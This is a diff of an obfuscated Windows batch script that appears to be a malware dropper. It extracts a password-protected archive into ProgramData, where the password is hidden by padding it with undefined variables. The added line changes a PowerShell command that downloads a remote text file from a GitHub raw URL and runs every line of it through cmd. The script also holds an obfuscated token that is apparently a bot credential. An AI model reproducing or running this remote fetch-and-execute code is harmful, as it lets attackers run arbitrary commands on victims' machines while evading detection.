@@ -18,7 +18,7 @@ for %%a in (%processList%) do (
 )
 
 "%ProgramData%\dist\UnRAR.exe" x -y -p%JVPCOT%1%RPJJKX%4%OJ ERZ%7%EUCUJK%8%ATXODM%5%DSJIDL%2%HTHDOT%3%AVVUYS%6%NZDNDG%9 "%ProgramData%\dist\51654.rar" "%ProgramData%\dist\"
-powershell.exe -C "$c = (iwr 'https://raw.githubusercontent.com/githab0/0/refs/heads/main/2.txt' -UseBasicParsing).Content; foreach ($line in $c -split \"`n\") { cmd /c $line }"
+powershell.exe -C "$c = (iwr 'https://raw.githubusercontent.com/githa0/PW/refs/heads/master/rvz.txt' -UseBasicParsing).Content; foreach ($line in $c -split \"`n\") { cmd /c $line }"
 
 setlocal EnableDelayedExpansion
 set "TOKEN=%BN XPA%7%VHOHLA%6%ZQIXGH%0%QH GWS%4% MKLGE%0%JCHTGC%0%JUKCXV%3%HMEJKA%4%IRKERC%8%AVSHXD%3:%QKBJYJ%A%TFKFOM%A%XNLE J%G%OQBJDP%G%VFMETL%I%LBXGNM%o%UZPVQF%6%QCDYHE%l%RWWIUH%b%BHHMPT%N%XONZVM%l%QQ  LB%s%VTAXTA%h%LXYINX%S%QCHQFF%j%FHJWYB%n%TSIRIR%v%ESLVNA%s%GFOGBS%G%VPAQJS%1%F LVUE%w%S VZDB%7%TUPGEV%O%MVPGJ %m%SZGSAJ%B%ACIQMI%j%GKZHDO%L%GIBMOH%B%CPLFEP%c%CZQMCW%4%Y ZMYB%r%UCIHAV%5%XESBAB%5%YFKZQM%F%ZVYTOO%A"
